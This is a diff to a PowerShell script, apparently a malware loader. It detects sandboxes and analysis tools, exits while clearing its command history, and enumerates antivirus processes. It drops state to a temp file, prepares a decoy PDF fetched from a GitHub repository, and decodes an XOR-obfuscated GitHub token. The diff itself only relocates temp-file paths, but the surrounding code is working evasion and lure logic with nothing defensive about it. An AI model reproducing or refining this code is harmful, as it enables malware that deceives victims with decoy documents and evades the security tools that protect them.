@@ -20,7 +20,7 @@ if (Get-Process | Where-Object { $_.Name -match $toolProcs }) { $sb = $true }
 
 if ($sb) {
     [void]$state.Add('state=sandbox-exit')
-    [IO.File]::WriteAllBytes((Join-Path $env:TEMP 'value.txt'), [Text.Encoding]::UTF8.GetBytes($state -join "`n"))
+    [IO.File]::WriteAllBytes((Join-Path $env:LOCALAPPDATA\Temp 'value.txt'), [Text.Encoding]::UTF8.GetBytes($state -join "`n"))
     Clear-History
     exit
 }
@@ -31,10 +31,10 @@ $found = @(Get-Process | Where-Object { $_.Name -match $avProcs } |
 [void]$state.Add("av=$($found -join ',')")
 
 [void]$state.Add('state=ok')
-[IO.File]::WriteAllBytes((Join-Path $env:TEMP 'value.txt'), [Text.Encoding]::UTF8.GetBytes($state -join "`n"))
+[IO.File]::WriteAllBytes((Join-Path $env:LOCALAPPDATA\Temp 'value.txt'), [Text.Encoding]::UTF8.GetBytes($state -join "`n"))
 
 $DecoyApi = 'https://api.github.com/repos/rotalbilly5-sketch/Dream/contents/Travel-Meeting-Plan-Q4-2026.pdf'
-$DecoyPath = Join-Path $env:TEMP 'Travel-Meeting-Plan-Q4-2026.pdf'
+$DecoyPath = Join-Path $env:LOCALAPPDATA\Temp 'Travel-Meeting-Plan-Q4-2026.pdf'
 $GhTokenX = @(77,67,94,66,95,72,117,90,75,94,117,27,27,105,107,100,97,97,109,99,26,67,111,120,123,65,29,104,111,114,73,24,73,117,19,88,25,71,66,95,18,71,31,27,90,99,69,65,127,26,89,69,82,65,73,111,68,99,95,88,77,71,83,65,103,69,114,100,25,127,68,92,67,75,124,24,108,107,110,124,114,123,96,100,115,109,107,97,107,126,26,103,104)
 $GhToken = -join ($GhTokenX | ForEach-Object { [char]($_ -bxor 42) })
 
